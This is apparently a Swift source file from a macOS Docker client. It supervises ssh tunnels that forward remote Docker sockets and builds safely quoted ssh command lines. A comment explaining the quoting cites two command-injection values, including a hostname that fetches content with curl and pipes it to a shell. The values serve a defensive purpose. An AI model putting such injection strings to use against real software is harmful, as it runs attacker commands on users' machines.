import Foundation

/// Forwards a remote host's Docker socket to a local unix socket, by supervising one
/// `ssh(1)` child per host:
///
/// ```
/// ssh -N -L ~/.velox/hosts/<id>.sock:/var/run/docker.sock user@server
/// ```
///
/// **Why a child process and not a Swift SSH client.** `ssh -L local_socket:remote_socket`
/// hands back exactly what `DockerClient` already consumes — a local socket whose
/// `connect(2)` yields a plain fd — so the entire existing client stack (`HTTPCodec`,
/// chunked decoding, log-frame demuxing, `shutdown()`-based stream cancellation) serves
/// remote hosts unchanged. The alternative is a Swift SSH implementation, which means
/// either a large dependency in a package that has **zero**, or hand-writing crypto and a
/// transport protocol. `/usr/bin/ssh` ships with macOS, is the same mechanism `docker
/// context`'s own `ssh://` support uses, and brings the user's `~/.ssh/config`, keys,
/// `known_hosts` and agent with it for free. It is transient and per-host — not a daemon
/// (CLAUDE.md pillar #2) — and carries no Velox connection state.
///
/// **§10 note:** this is process supervision, not a fourth byte relay. `ssh` does the
/// relaying; `EventRelay` is neither duplicated nor involved.
///
/// **§8 note:** reconnection is driven by `Process.terminationHandler` — the child's exit
/// *is* the event. Nothing polls for liveness. The one timer is the backoff delay before
/// a redial, which is a genuine delay with no event source.
public final class SSHTunnel: @unchecked Sendable {

    public enum State: Equatable, Sendable {
        /// Not started, or deliberately stopped.
        case stopped
        /// An ssh child is alive but no Docker request has succeeded through it yet.
        case connecting
        /// A Docker request has completed over this tunnel.
        case connected
        /// The child exited unexpectedly; the string is ssh's own diagnostic.
        case failed(String)

        public var label: String {
            switch self {
            case .stopped:   return "Disconnected"
            case .connecting: return "Connecting…"
            case .connected: return "Connected"
            case .failed:    return "Connection failed"
            }
        }

        public var failureMessage: String? {
            if case .failed(let message) = self { return message }
            return nil
        }
    }

    public let host: RemoteHost

    /// Every field is reached only under `Locked`'s mutex, which is exactly what
    /// `@unchecked` asserts here — `Process` and `DispatchWorkItem` are not `Sendable`
    /// on their own.
    private struct Supervision: @unchecked Sendable {
        var process: Process?
        var state: State = .stopped
        /// Set while a deliberate stop is in flight, so the termination handler doesn't
        /// mistake it for a dropped connection and redial.
        var stopping = false
        var attempt = 0
        var retry: DispatchWorkItem?
        var stderr: [String] = []
    }

    private let box = Locked(Supervision())

    /// ONE queue for every tunnel, not one per instance.
    ///
    /// A host's forwarded socket path is a pure function of its id, so the tunnel being
    /// torn down and the tunnel being started for the same host contend for the same path.
    /// With a queue each, `disconnect()` immediately followed by `select()` — literally
    /// what the Reconnect button does — could interleave so that the old tunnel's
    /// `removeSocket()` unlinked the *new* tunnel's live socket. The new `ssh` then stays
    /// alive and never exits, so there is no termination event and no redial: every request
    /// fails with ENOENT forever and the pane sits on "Connecting…" until the user quits.
    /// Serialising all supervision makes submission order the execution order. These are
    /// rare, cheap operations (spawn/terminate), so one queue is not a bottleneck.
    private static let queue = DispatchQueue(label: "dev.velox.ssh.tunnel")
    private var queue: DispatchQueue { Self.queue }

    /// Concurrent: one blocking stderr reader parks here per live child, so they must not
    /// serialize behind each other.
    private static let stderrQueue = DispatchQueue(label: "dev.velox.ssh.stderr",
                                                   attributes: .concurrent)
    /// Notified on every state transition, from a background queue. Settable because the
    /// owner is typically an object that cannot reference itself at `init` time.
    private let stateHandler = Locked<(@Sendable (State) -> Void)?>(nil)
    public var onStateChange: (@Sendable (State) -> Void)? {
        get { stateHandler.value }
        set { stateHandler.value = newValue }
    }

    /// Backoff between redials. Capped well below a human's patience so a server that
    /// comes back finds us quickly, but high enough that an unreachable host isn't
    /// dialled in a tight loop.
    private static let backoff: [Double] = [1, 2, 4, 8, 15, 30]

    public init(host: RemoteHost) {
        self.host = host
    }

    public var state: State { box.value.state }

    /// A connector that dials this tunnel's local socket. Handed straight to
    /// `DockerClient` — it is the whole integration surface.
    public var connector: any DockerConnector {
        UnixSocketConnector(path: host.localSocketURL.path)
    }

    // MARK: - Lifecycle

    /// Spawn the ssh child (idempotent — a second call while one is alive does nothing).
    public func start() {
        queue.async { [self] in
            let alreadyUp: Bool = box.withLock { s in
                s.stopping = false
                s.retry?.cancel(); s.retry = nil
                return s.process != nil
            }
            guard !alreadyUp else { return }
            spawn()
        }
    }

    /// Terminate the child and stop redialling.
    public func stop() {
        queue.async { [self] in
            let process: Process? = box.withLock { s in
                s.stopping = true
                s.retry?.cancel(); s.retry = nil
                s.attempt = 0
                s.stderr.removeAll()
                defer { s.process = nil }
                return s.process
            }
            process?.terminationHandler = nil
            // Terminating closes the child's end of the stderr pipe, which is what ends the
            // reader loop and releases its fd — no separate teardown to get wrong.
            if process?.isRunning == true { process?.terminate() }
            removeSocket()
            publish(.stopped)
        }
    }

    /// Called by the owner when a Docker request has actually completed over this tunnel.
    /// Readiness is "the daemon answered", the same signal `DockerEventsWatcher` uses —
    /// there is no `/_ping` poll and no watching for the socket file to appear.
    public func markReachable() {
        let changed: Bool = box.withLock { s in
            guard s.process != nil, s.state != .connected else { return false }
            s.state = .connected
            s.attempt = 0                     // a working connection resets the backoff
            return true
        }
        if changed { stateHandler.value?(.connected) }
    }

    /// Wait — bounded — for every queued tunnel start/stop to actually run.
    ///
    /// `stop()` is asynchronous, so a caller that is about to exit the process (app
    /// termination) would otherwise return before any child was signalled, leaving orphaned
    /// `ssh -N` processes that never exit on their own and hold sessions to production
    /// servers across relaunches.
    public static func drainPendingWork() {
        queue.settle("ssh tunnels")
    }

    // MARK: - Internals

    private func publish(_ state: State) {
        let changed: Bool = box.withLock { s in
            guard s.state != state else { return false }
            s.state = state
            return true
        }
        if changed { stateHandler.value?(state) }
    }

    /// `ssh` refuses to bind a path that already exists ("Address already in use"), and a
    /// stale socket from a killed child would otherwise make every redial fail.
    private func removeSocket() {
        try? FileManager.default.removeItem(at: host.localSocketURL)
    }

    private func spawn() {
        // A unix socket path must fit `sockaddr_un.sun_path`, and ssh enforces the same
        // bound on `-L` — over it, ssh dies instantly with "Bad local forwarding
        // specification", which the redial loop would then repeat forever behind a
        // message that explains nothing. Normally impossible (`~/.velox/hosts/<id>.sock`
        // is ~40 bytes, which is why host ids are short), but reachable via a deep
        // `VELOX_HOME`. Fail once, clearly, and do NOT schedule a retry: no amount of
        // redialling fixes a path that cannot be represented.
        if let complaint = Self.spawnComplaint(for: host) {
            publish(.failed(complaint))
            return
        }
        do {
            // 0700: each socket in here is unauthenticated access to a remote Docker daemon
            // — root-equivalent on that machine. OpenSSH's `StreamLocalBindMask` already
            // makes the socket itself 0600; this closes the directory on a shared Mac too.
            let fm = FileManager.default
            try fm.createDirectory(at: Paths.remoteHosts, withIntermediateDirectories: true,
                                   attributes: [.posixPermissions: 0o700])
            // Set it explicitly as well: `createDirectory`'s attributes apply only when it
            // actually creates the directory, so an install that already has one from an
            // earlier build would otherwise keep the old 0755 forever.
            try? fm.setAttributes([.posixPermissions: 0o700], ofItemAtPath: Paths.remoteHosts.path)
        } catch {
            publish(.failed("Couldn't create \(Paths.remoteHosts.path): \(error.localizedDescription)"))
            return
        }
        removeSocket()

        let process = Process()
        process.executableURL = URL(fileURLWithPath: Self.sshPath)
        process.arguments = Self.arguments(for: host)

        let errPipe = Pipe()
        process.standardError = errPipe
        process.standardOutput = FileHandle.nullDevice
        // -N sends nothing on stdin; give it an explicit empty one so the child can never
        // inherit and consume the parent's.
        process.standardInput = FileHandle.nullDevice

        // Drain stderr with a blocking read-to-EOF loop rather than a `readabilityHandler`.
        // Both alternatives were tried and both are wrong: a dispatch read source reads a
        // closed far end as *permanently readable*, so a handler left attached re-fires in a
        // tight loop forever; and detaching it then closing the fd races any block already
        // inside `availableData`, which raises an ObjC exception on a bad fd — fatal in
        // Swift. Merely detaching without closing leaks the fd, because Foundation keeps the
        // `Pipe` alive with the `Process` (measured: ~1.8 fds per connect/disconnect,
        // growing without bound). A loop that reads to EOF and closes on the same thread has
        // none of the three problems and needs no teardown from anywhere else.
        let drained = DispatchSemaphore(value: 0)
        Self.stderrQueue.async { [weak self] in
            let handle = errPipe.fileHandleForReading
            while true {
                let data = handle.availableData
                if data.isEmpty { break }          // EOF — the child's end is closed
                guard let self else { continue }   // keep draining so the child can't block
                let text = String(decoding: data, as: UTF8.self)
                self.box.withLock { s in
                    for line in text.split(separator: "\n", omittingEmptySubsequences: true) {
                        let trimmed = line.trimmingCharacters(in: .whitespaces)
                        if !trimmed.isEmpty { s.stderr.append(trimmed) }
                    }
                    // Only the tail matters; don't accumulate a chatty -v session forever.
                    if s.stderr.count > 8 { s.stderr.removeFirst(s.stderr.count - 8) }
                }
                // A forward that the SERVER refuses does not end the child: `-L` is a local
                // forward, so `ExitOnForwardFailure` only covers binding our own listener.
                // ssh happily stays up and refuses every channel, which would leave the
                // tunnel on "Connecting…" indefinitely with the explanation sitting unread
                // in this very buffer. Ending the child routes it through the normal failure
                // path — diagnostic, backoff, redial — instead of inventing a second one.
                if Self.isForwardRefusal(text), process.isRunning {
                    Log.warn("ssh tunnel: the server refused to forward its socket; ending the child")
                    process.terminate()
                }
            }
            try? handle.close()
            drained.signal()
        }

        process.terminationHandler = { [weak self] proc in
            guard let self else { return }
            // ssh writes its diagnostic immediately before exiting, and termination can be
            // observed before the reader has seen those bytes — so wait, briefly and
            // bounded, for EOF. Deliberately waited HERE, on the termination handler's own
            // thread, and not inside `handleExit`: that runs on the single queue every
            // tunnel shares, which `drainPendingWork()` must drain within `settle`'s 5s
            // budget at app quit. Blocking it per flapping host would eat that budget and
            // orphan `ssh` children — the exact failure `drainPendingWork` exists to stop.
            _ = drained.wait(timeout: .now() + .milliseconds(250))
            self.queue.async { self.handleExit(of: proc) }
        }

        // Cleared BEFORE launch: the reader thread is already running, so clearing after
        // `run()` can wipe a diagnostic ssh emitted in between — turning a precise
        // "Permission denied (publickey)" into a bare exit code.
        box.withLock { $0.stderr.removeAll() }
        do {
            try process.run()
        } catch {
            // Nothing will ever close the child's end, so close ours to give the reader its
            // EOF — otherwise that thread parks forever on a pipe with no writer.
            process.terminationHandler = nil
            try? errPipe.fileHandleForWriting.close()
            publish(.failed("Couldn't run \(Self.sshPath): \(error.localizedDescription)"))
            return
        }

        box.withLock { s in
            s.process = process
        }
        publish(.connecting)
        Log.info("ssh tunnel \(host.name): \(host.sshDestination) → \(host.localSocketURL.lastPathComponent)")
    }

    private func handleExit(of process: Process) {
        let shouldRetry: Bool = box.withLock { s in
            // A deliberate stop, or the exit of a child we already replaced.
            guard !s.stopping, s.process === process else { return false }
            s.process = nil
            return true
        }
        // Only OUR socket, and only when this is still the live child: a stale child's late
        // exit must not unlink the path a newer tunnel is already serving.
        guard shouldRetry else { return }
        removeSocket()

        let diagnostics = box.value.stderr
        let reason = Self.explain(diagnostics: diagnostics,
                                  status: process.terminationStatus,
                                  destination: host.sshDestination,
                                  killed: process.terminationReason == .uncaughtSignal)
        publish(.failed(reason))
        Log.warn("ssh tunnel \(host.name): exited (\(reason))")

        // Redial with bounded exponential backoff. Auth and host-key failures are redialled
        // too — the user fixing `known_hosts` or adding their key in another window is
        // exactly the case worth recovering from without a manual reconnect — but slowly,
        // since they cannot succeed until a human acts.
        let delay: Double = box.withLock { s in
            let index = min(s.attempt, Self.backoff.count - 1)
            s.attempt += 1
            return Self.backoff[index]
        }
        let work = DispatchWorkItem { [weak self] in
            guard let self else { return }
            guard !self.box.value.stopping else { return }
            self.spawn()
        }
        box.withLock { $0.retry = work }
        queue.asyncAfter(deadline: .now() + delay, execute: work)
    }

    // MARK: - Command construction (pure — exercised by velox-selftest)

    private static let sshPath = "/usr/bin/ssh"

    /// `sockaddr_un.sun_path` is 104 bytes on Darwin, and OpenSSH applies the same bound
    /// when parsing a `-L` unix-socket forward.
    private static let maxSocketPathBytes = 104

    /// Why this host's forwarded socket path can't be used, or nil when it's fine.
    /// Pure, so `velox-selftest` can pin the boundary without spawning ssh.
    public static func spawnComplaint(for host: RemoteHost) -> String? {
        // A manifest written by hand (or by an older build) never went through field
        // validation, so re-check the values that change what ssh *does* before spawning it.
        if RemoteHost.optionLikeComplaint(host.user, field: "Username") != nil
            || RemoteHost.optionLikeComplaint(host.hostname, field: "Host") != nil {
            return "This host's user or hostname starts with a dash, which ssh would read as "
                 + "an option rather than a destination. Edit the host to fix it."
        }
        if RemoteHost.hasBlankOrControl(host.user) || RemoteHost.hasBlankOrControl(host.hostname) {
            return "This host's user or hostname contains whitespace, which ssh cannot use. "
                 + "Edit the host to fix it."
        }
        if let identity = host.identityFile,
           RemoteHost.optionLikeComplaint(identity, field: "Identity file") != nil {
            return "This host's identity file path starts with a dash. Edit the host to fix it."
        }
        return socketPathComplaint(for: host)
    }

    public static func socketPathComplaint(for host: RemoteHost) -> String? {
        let path = host.localSocketURL.path
        let count = path.utf8.count
        guard count >= maxSocketPathBytes else { return nil }
        return "The forwarded socket path is too long for a unix socket "
            + "(\(count) bytes, limit \(maxSocketPathBytes - 1)): \(path). "
            + "Set VELOX_HOME to a shorter directory."
    }

    /// The argument vector for a host's tunnel.
    ///
    /// - `-N -T`: no remote command, no TTY — this connection only carries the forward.
    /// - `BatchMode=yes`: never prompt. Velox has no way to render an ssh password or
    ///   passphrase prompt, and deliberately stores no credentials, so a host that needs
    ///   one must fail with a message rather than hang invisibly on a prompt nobody sees.
    /// - `ExitOnForwardFailure=yes`: if the forward can't be established, exit instead of
    ///   sitting there looking connected while every request fails.
    /// - `ServerAliveInterval`/`CountMax`: notice a dropped link in ~45s rather than
    ///   never. This is ssh's own keepalive, not a status poll of ours.
    ///
    /// Host-key checking is left at the user's own setting on purpose: under `BatchMode`
    /// an unknown host fails with "Host key verification failed", which is the honest
    /// outcome. Velox will not silently trust a new key on the user's behalf.
    public static func arguments(for host: RemoteHost) -> [String] {
        var args = [
            "-N", "-T",
            "-o", "BatchMode=yes",
            "-o", "ExitOnForwardFailure=yes",
            "-o", "ServerAliveInterval=15",
            "-o", "ServerAliveCountMax=3",
            "-o", "ConnectTimeout=10",
        ]
        // Only pass `-p` for a non-default port, deliberately. Passing `-p 22` always
        // would OVERRIDE a `Port` set for that host in the user's `~/.ssh/config`, which
        // is precisely how someone running sshd on a non-standard port has it configured —
        // and they would then be unable to connect while Velox looked correct.
        if host.port != RemoteHost.defaultPort {
            args += ["-p", "\(host.port)"]
        }
        if let identity = host.identityFile, !identity.isEmpty {
            args += ["-i", (identity as NSString).expandingTildeInPath]
        }
        args += ["-L", "\(host.localSocketURL.path):\(host.socketPath)"]
        args.append(host.sshDestination)
        return args
    }

    /// POSIX single-quoting: the only reliable way to hand an arbitrary value to a shell.
    ///
    /// These command strings are re-parsed up to three times — AppleScript literal, the
    /// local shell Terminal runs them in, and (for a remote host) the shell on the far side
    /// of ssh. Escaping just the AppleScript layer, as this code first did, leaves the shell
    /// layers wide open: a container id of `a";id;"` or a hostname of `h;curl${IFS}x|sh`
    /// both execute on the user's Mac. Container ids come from the *daemon* — a machine the
    /// user may not control — and hostnames survive a hand-edited `hosts.json` that never
    /// passes field validation at all, so neither can be trusted.
    public static func shellQuoted(_ value: String) -> String {
        "'" + value.replacingOccurrences(of: "'", with: "'\\''") + "'"
    }

    /// The `ssh` command line that runs `body` on this host, as a command the user can
    /// paste into their own shell.
    ///
    /// **`body` is quoted a second time**, and that is the whole point of routing every
    /// caller through here. ssh joins its remote-command arguments with spaces and hands the
    /// result to the shell on the server, which re-parses it — so a body already quoted for
    /// one shell arrives at the server unquoted. Getting this wrong twice (once in the
    /// Terminal hand-off, once in "Copy as docker run") is why the rule lives in exactly one
    /// function instead of at each call site.
    public static func sshCommand(running body: String, user: String,
                                  hostname: String, port: Int, tty: Bool = false) -> String {
        let ttyFlag = tty ? "-t " : ""
        return "ssh \(ttyFlag)\(portFlag(port))\(shellQuoted("\(user)@\(hostname)")) "
             + shellQuoted(body)
    }

    /// The `ssh` command line for an interactive shell **inside a container** on this host,
    /// handed to the user's own Terminal.
    ///
    /// Quoted at both levels, which is what the nesting requires: the container id is
    /// single-quoted for the *remote* shell, and the whole remote command is single-quoted
    /// again for the *local* one. ssh joins its remote-command arguments with spaces and
    /// lets the far-side shell re-parse the result, so a single level of quoting is
    /// consumed in transit — unquoted, the remote shell runs `exec bash` on the server and
    /// drops the user into a host shell that looks like a container shell.
    public static func terminalShellCommand(containerID: String, user: String,
                                            hostname: String, port: Int) -> String {
        let script = "command -v bash >/dev/null && exec bash || exec sh"
        let remote = "docker exec -it \(shellQuoted(containerID)) sh -c \(shellQuoted(script))"
        return sshCommand(running: remote, user: user, hostname: hostname, port: port, tty: true)
    }

    /// The `ssh` command line for a plain login shell on this host.
    public static func terminalLoginCommand(user: String, hostname: String, port: Int) -> String {
        "ssh \(portFlag(port))\(shellQuoted("\(user)@\(hostname)"))"
    }

    /// Shared by both, so the "omit `-p` at the default so ~/.ssh/config still wins" rule
    /// exists in exactly one place.
    private static func portFlag(_ port: Int) -> String {
        port == RemoteHost.defaultPort ? "" : "-p \(port) "
    }

    /// Whether a stderr chunk says the *server* refused to open the forwarded channel.
    /// Distinct from a failure to start: the child is alive and will stay alive.
    public static func isForwardRefusal(_ text: String) -> Bool {
        text.contains("administratively prohibited")
            || (text.contains("open failed") && text.contains("channel"))
    }

    /// Turn ssh's stderr into one line worth showing a user, with a hint where the raw
    /// text is too terse to act on.
    public static func explain(diagnostics: [String], status: Int32,
                               destination: String, killed: Bool = false) -> String {
        let text = diagnostics.joined(separator: " ")
        if text.contains("Host key verification failed") {
            return "Host key verification failed — run `ssh \(destination)` in Terminal once "
                + "to check and accept this server's key, then reconnect."
        }
        if text.contains("Permission denied") {
            return "Permission denied — ssh couldn't authenticate. Velox never prompts for "
                + "a password, so this host needs a key your ssh-agent already holds."
        }
        if text.contains("Could not resolve hostname") {
            return "Could not resolve that hostname."
        }
        if text.contains("Connection refused") {
            return "Connection refused — nothing is listening for ssh on that host and port."
        }
        if text.contains("Connection timed out") || text.contains("Operation timed out") {
            return "Connection timed out."
        }
        if text.contains("administratively prohibited") || text.contains("open failed") {
            return "The server refused to forward its Docker socket. Check that the socket "
                + "path is right and that your user can reach it (usually: be in the "
                + "`docker` group)."
        }
        if let last = diagnostics.last(where: { !$0.isEmpty }) { return last }
        // Signalled from outside (a `pkill`, a sleep/wake teardown, an agent restart) and
        // signalled cleanly enough to leave no diagnostic. Foundation reports this as
        // status 0, so without this branch it reads as the nonsense "exited with status 0".
        if killed { return "The SSH connection was closed. Reconnecting…" }
        return "ssh exited with status \(status)."
    }
}
